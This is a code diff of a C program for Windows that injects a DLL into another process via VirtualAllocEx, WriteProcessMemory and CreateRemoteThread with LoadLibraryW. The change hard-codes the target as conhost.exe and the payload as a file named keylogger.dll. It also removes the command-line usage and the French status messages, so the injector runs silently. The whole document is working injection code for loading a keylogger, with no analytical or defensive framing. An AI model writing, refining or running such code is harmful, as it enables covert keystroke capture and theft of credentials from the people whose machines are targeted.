@@ -8,19 +8,24 @@
 
 DWORD FindTargetPID(const wchar_t* targetName)
 {
+	// Create a snapshot of all processes in the system
 	PROCESSENTRY32W pe;
 	pe.dwSize = sizeof(PROCESSENTRY32W);
 
+	// Take a snapshot of the processes
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (snapshot == INVALID_HANDLE_VALUE)
 		return 0;
 
+	// Iterate through the processes in the snapshot
 	if (Process32FirstW(snapshot, &pe))
 	{
 		do
 		{
+			// Compare the process name with the target name
 			if (wcscmp(pe.szExeFile, targetName) == 0)
 			{
+				// Found the target process, return its PID
 				CloseHandle(snapshot);
 				return pe.th32ProcessID;
 			}
@@ -31,63 +36,54 @@ DWORD FindTargetPID(const wchar_t* targetName)
 	return 0;
 }
 
-int wmain(int argc, wchar_t* argv[])
+int wmain(void)
 {
-	if (argc != 2)
-	{
-		wprintf(L"Usage: %s <process.exe>\n", argv[0]);
-		return 1;
-	}
 	const wchar_t* dllPath = L"C:\\Users\\Celeste\\Documents\\tinkyWinkey\\keylogger.dll";
-	const wchar_t* targetProcess = argv[1];
+	const wchar_t* targetProcess = L"conhost.exe";
 
+	// Find the target process ID
 	DWORD pid = FindTargetPID(targetProcess);
 	if (pid == 0)
-	{
-		wprintf(L"Processus cible non trouvé.\n");
 		return 1;
-	}
 
+	// Open the target process with all access rights
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (!hProcess)
-	{
-		wprintf(L"Impossible d'ouvrir le processus.\n");
 		return 1;
-	}
 
+	// Allocate memory in the target process for the DLL path
 	size_t dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
 
 	LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!remoteMem)
 	{
-		wprintf(L"Échec de l'allocation mémoire distante.\n");
 		CloseHandle(hProcess);
 		return 1;
 	}
 
+	// Write the DLL path to the allocated memory
 	if (!WriteProcessMemory(hProcess, remoteMem, (LPVOID)dllPath, dllPathSize, NULL))
 	{
-		wprintf(L"Échec de l'écriture mémoire distante.\n");
 		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
 		CloseHandle(hProcess);
 		return 1;
 	}
 
+	// Create a remote thread in the target process to load the DLL
 	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
 		(LPTHREAD_START_ROUTINE)LoadLibraryW, remoteMem, 0, NULL);
 
 	if (!hThread)
 	{
-		wprintf(L"Échec de la création du thread distant.\n");
 		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
 		CloseHandle(hProcess);
 		return 1;
 	}
 
+	// Wait for the remote thread to finish and clean up
 	WaitForSingleObject(hThread, INFINITE);
 	CloseHandle(hThread);
 	CloseHandle(hProcess);
 
-	wprintf(L"Injection réussie.\n");
 	return 0;
 }
